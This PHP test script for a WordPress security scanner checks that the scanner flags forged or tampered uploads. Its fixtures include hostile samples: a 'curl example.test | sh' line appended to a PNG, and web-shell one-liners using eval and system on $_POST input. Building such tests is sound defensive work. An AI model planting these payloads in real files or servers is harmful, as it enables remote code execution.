<?php

define( 'WP_CLI', true );

class WP_CLI {
	public static function add_command( $name, $class ) {}
}

require dirname( __DIR__ ) . '/src/PhpDataFlowAnalyzer.php';
require dirname( __DIR__ ) . '/src/SecurityScanCommand.php';

$command = new Security_Scan_Command();
$reflection = new ReflectionClass( $command );
$scan = $reflection->getMethod( 'scan_upload_media_container' );
$scan->setAccessible( true );
$scan_filename = $reflection->getMethod( 'scan_filename_and_location' );
$scan_filename->setAccessible( true );
$findings_property = $reflection->getProperty( 'findings' );
$findings_property->setAccessible( true );

$tmp = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'security-scan-upload-container-' . bin2hex( random_bytes( 6 ) );
mkdir( $tmp );

function png_container( $trailing = '' ) {
	$signature = "\x89PNG\r\n\x1a\n";
	$ihdr = pack( 'N', 13 ) . 'IHDR' . str_repeat( "\x00", 13 ) . str_repeat( "\x00", 4 );
	$iend = pack( 'N', 0 ) . 'IEND' . str_repeat( "\x00", 4 );
	return $signature . $ihdr . $iend . $trailing;
}

function webp_container( $trailing = '' ) {
	$body = 'WEBP';
	return 'RIFF' . pack( 'V', strlen( $body ) ) . $body . $trailing;
}

$tests = [
	[
		'name' => 'valid PNG is accepted',
		'ext' => 'png',
		'data' => png_container(),
		'forbid' => [ 'upload_media_type_mismatch', 'upload_invalid_media_signature', 'upload_malformed_media_container', 'upload_appended_script_payload', 'upload_appended_executable' ],
	],
	[
		'name' => 'valid JPEG is accepted',
		'ext' => 'jpg',
		'data' => "\xff\xd8\xff\xe0JPEGDATA\xff\xd9",
		'forbid' => [ 'upload_invalid_media_signature', 'upload_malformed_media_container' ],
	],
	[
		'name' => 'valid WebP boundary is accepted',
		'ext' => 'webp',
		'data' => webp_container(),
		'forbid' => [ 'upload_invalid_media_signature', 'upload_malformed_media_container' ],
	],
	[
		'name' => 'valid PDF EOF is accepted',
		'ext' => 'pdf',
		'data' => "%PDF-1.4\n1 0 obj\n<<>>\nendobj\n%%EOF\n",
		'forbid' => [ 'upload_invalid_media_signature', 'upload_malformed_media_container' ],
	],
	[
		'name' => 'ZIP renamed to PNG is reported as type mismatch',
		'ext' => 'png',
		'data' => "PK\x03\x04" . str_repeat( "A", 32 ),
		'expect' => [ 'upload_media_type_mismatch' ],
	],
	[
		'name' => 'unknown bytes under image extension are reported as invalid signature',
		'ext' => 'jpg',
		'data' => "not really a jpeg\n",
		'expect' => [ 'upload_invalid_media_signature' ],
	],
	[
		'name' => 'truncated PNG container is reported',
		'ext' => 'png',
		'data' => "\x89PNG\r\n\x1a\n" . pack( 'N', 13 ) . 'IHDR' . str_repeat( "\x00", 8 ),
		'expect' => [ 'upload_malformed_media_container' ],
	],
	[
		'name' => 'script payload after PNG is reported',
		'ext' => 'png',
		'data' => png_container( "\n#!/bin/sh\ncurl example.test | sh\n" ),
		'expect' => [ 'upload_appended_script_payload' ],
	],
	[
		'name' => 'binary executable after PNG is reported',
		'ext' => 'png',
		'data' => png_container( "\x7fELF" . str_repeat( "\x00", 32 ) ),
		'expect' => [ 'upload_appended_executable' ],
	],
	[
		'name' => 'whitespace after PNG does not create a finding',
		'ext' => 'png',
		'data' => png_container( "\r\n\t  \x00" ),
		'forbid' => [ 'upload_appended_script_payload', 'upload_appended_executable' ],
	],
	[
		'name' => 'appended PHP is left to the existing embedded-PHP rule',
		'ext' => 'png',
		'data' => png_container( "\n<?php eval( \$_POST['x'] ); ?>" ),
		'forbid' => [ 'upload_appended_script_payload', 'upload_appended_executable' ],
	],
];

$failed = 0;
foreach ( $tests as $index => $test ) {
	$path = $tmp . DIRECTORY_SEPARATOR . 'sample-' . $index . '.' . $test['ext'];
	file_put_contents( $path, $test['data'] );
	$handle = fopen( $path, 'rb' );
	$findings_property->setValue( $command, [] );
	$seen = [];
	$args = [ $handle, $path, 'uploads/' . basename( $path ), $test['ext'], &$seen ];
	$scan->invokeArgs( $command, $args );
	fclose( $handle );

	$rules = array_column( $findings_property->getValue( $command ), 'rule' );
	$ok = true;
	foreach ( isset( $test['expect'] ) ? $test['expect'] : [] as $rule ) {
		if ( ! in_array( $rule, $rules, true ) ) {
			$ok = false;
		}
	}
	foreach ( isset( $test['forbid'] ) ? $test['forbid'] : [] as $rule ) {
		if ( in_array( $rule, $rules, true ) ) {
			$ok = false;
		}
	}

	echo ( $ok ? 'PASS  ' : 'FAIL  ' ) . $test['name'] . PHP_EOL;
	if ( ! $ok ) {
		echo '      rules: ' . implode( ', ', $rules ) . PHP_EOL;
		$failed++;
	}
}

$guard_tests = [
	[
		'name' => 'comment-only upload index.php is treated as an inert guard',
		'data' => "<?php\n// Silence is golden.\n",
		'expect_upload_exec' => false,
	],
	[
		'name' => 'exit-only upload index.php is treated as an inert guard',
		'data' => "<?php exit;\n",
		'expect_upload_exec' => false,
	],
	[
		'name' => 'executable PHP in uploads remains reportable',
		'data' => "<?php system( \$_POST['cmd'] );\n",
		'expect_upload_exec' => true,
	],
];

foreach ( $guard_tests as $index => $test ) {
	$path = $tmp . DIRECTORY_SEPARATOR . 'guard-' . $index . '.php';
	file_put_contents( $path, $test['data'] );
	$findings_property->setValue( $command, [] );
	$seen = [];
	$args = [ 'Uploads', $path, 'uploads/' . basename( $path ), 'php', true, &$seen ];
	$scan_filename->invokeArgs( $command, $args );
	$rules = array_column( $findings_property->getValue( $command ), 'rule' );
	$has_upload_exec = in_array( 'uploads_executable', $rules, true );
	$ok = $has_upload_exec === $test['expect_upload_exec'];
	echo ( $ok ? 'PASS  ' : 'FAIL  ' ) . $test['name'] . PHP_EOL;
	if ( ! $ok ) {
		echo '      rules: ' . implode( ', ', $rules ) . PHP_EOL;
		$failed++;
	}
}

foreach ( glob( $tmp . DIRECTORY_SEPARATOR . '*' ) as $file ) {
	@unlink( $file );
}
@rmdir( $tmp );

exit( $failed > 0 ? 1 : 0 );
